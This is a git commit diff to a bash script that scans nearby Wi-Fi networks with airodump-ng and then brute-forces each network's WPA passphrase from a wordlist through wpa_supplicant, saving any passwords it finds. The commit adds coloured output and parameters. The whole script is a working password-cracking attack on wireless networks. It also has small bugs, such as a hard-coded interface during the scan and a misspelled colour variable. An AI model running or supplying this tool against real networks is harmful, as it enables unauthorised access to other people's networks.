ca6f3cf4b7f115f08338d60ac19fe5f5438ed060
k1lly-git <sem.espolin@gmail.com>
2023-12-07 00:38:35 +0300

    add color and etc

--- get_bssid_script.sh
+++ get_bssid_script.sh
@@ -1,8 +1,53 @@
 #!/bin/bash
 
+# ========== COLORS ==========
+DEF='\033[0m'
+BLACK='\033[0;30m'
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+GRAY='\033[0;37m'
+WHITE='\033[1;37m'
+# ========== COLORS ==========
+
+# ========== INIT ==========
+# CHECK ROOT
+if [[ "$(id -u)" != "0" ]];
+then
+  echo -e "${RED}Script must be run as root!${DEF}"
+  #exit 1
+fi
+
+# CHECK COUNT OF ARGUMENTS
+if (( $# != 2 ));
+then
+  echo -e "${RED}Invalid arguments${DEF}"
+fi
+
+# CHECK HELP
+for arg in $*;
+do
+  if [[ "$arg" == "--help" ]];
+  then
+    echo "usage: sudo ./get_bssid_script.sh <interface> <dict>"
+    exit 1
+  fi
+done
+
+INTERFACE=$1
+DICT=$2
+
+SCAN_TIME=3
+#exit 1
+
+# ==========================
+
 # ========== GET BSSID ==========
 airodump-ng wlan1 --output-format csv -w air &
-sleep 5
+sleep $SCAN_TIME
 killall airodump-ng
 touch bssid.txt
 sleep 1
@@ -10,7 +55,6 @@ sleep 1
 cat air-01.csv | awk {'print $1'} | grep --colour=never ":" | sed 's/.$//' > bssid.txt
 count=$(cat bssid.txt | wc -l)
 
-echo ""
 echo "[+] Complete!!!"
 echo "Count bssid's: $count"
 # ===============================
@@ -18,25 +62,25 @@ echo "Count bssid's: $count"
 # ========== CRACK ==========
 c=0
 IFS=$'\n'
-for bss in $(cat bssid.txt):
+for bss in $(cat bssid.txt);
 do
-  for pass in $(cat dict.txt):
+  for pass in $(cat $DICT);
   do
     c=$((c+=1))
-    echo -e "[$c]\t$bss : $pass"
+    echo -e "${GREY}[$c]\tTry... $bss : $pass${DEF}"
     echo -e "\tnetwork={" > wpa_supplicant.conf
     echo -e "\tbssid=$bss" >> wpa_supplicant.conf
     echo -e "\tpsk=\"$pass\"" >> wpa_supplicant.conf
     echo "}" >> wpa_supplicant.conf
     
-    timeout 10 wpa_supplicant -i wlan0 -c wpa_supplicant.conf 2>&1 > wpa_supplicant.log
+    timeout 15 wpa_supplicant -i $INTERFACE -c wpa_supplicant.conf 2>&1 >> wpa_supplicant.log
 
     if grep -q "completed" "wpa_supplicant.log";
     then
-      echo "[+] True"
+      echo -e "${GREEN}[+] Found $bss:$pass${DEF}"
       echo "[+] $bss:$pass" >> found.txt
     else
-      echo "[-] False"
+      echo -e "${RED}[-] $bss:$pass${DEF}"
     fi
 
  done
